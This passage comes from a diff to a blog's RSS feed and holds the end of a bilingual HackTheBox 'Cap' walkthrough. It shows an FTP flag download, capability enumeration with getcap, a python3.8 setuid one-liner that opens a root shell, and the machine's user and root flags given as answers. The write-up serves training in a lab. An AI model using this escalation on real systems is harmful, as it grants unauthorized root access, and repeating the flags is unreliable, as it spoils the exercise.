+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lrwxrwxrwx    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .bash_logout
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;3771&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwx------    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .cache
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lrwxrwxrwx    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .viminfo -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-r--------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 02:52 user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; get user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local: user.txt remote: user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;229&lt;/span&gt; Entering Extended Passive Mode &lt;span class=&#34;o&#34;&gt;(||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;9252&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;100% &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;************************************************&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt;       69.75 KiB/s    00:00 ETA
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; bytes received in 00:00 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.11 KiB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                             
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB/cap&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# cat user.txt     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1467ec4e2727efe7086edf14fa7d949b
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：1467ec4e2727efe7086edf14fa7d949b&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?&lt;/p&gt;
+&lt;p&gt;这台机器上具有特殊功能、可被滥用以获取 root 权限的二进制文件的完整路径是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nathan@cap:~$ getcap -r / 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/python3.8 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/ping &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/traceroute6.iputils &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/mtr-packet &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nathan@cap:~$ python3.8 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@cap:~# id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nathan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nathan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：/usr/bin/python3.8&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;submit-root-flag&#34;&gt;Submit Root Flag
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Submit the flag located in root&amp;rsquo;s home directory.&lt;/p&gt;
+&lt;p&gt;提交位于 root 用户主目录中的 flag。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@cap:~# cat /root/root.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0553454a65e020c51dfda665755812d4
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：0553454a65e020c51dfda665755812d4&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>MazeSec Pot</title>
         <link>https://Sp1ke-sec.github.io/p/mazesec-pot/</link>
         <pubDate>Fri, 06 Nov 2026 09:47:05 +0800</pubDate>
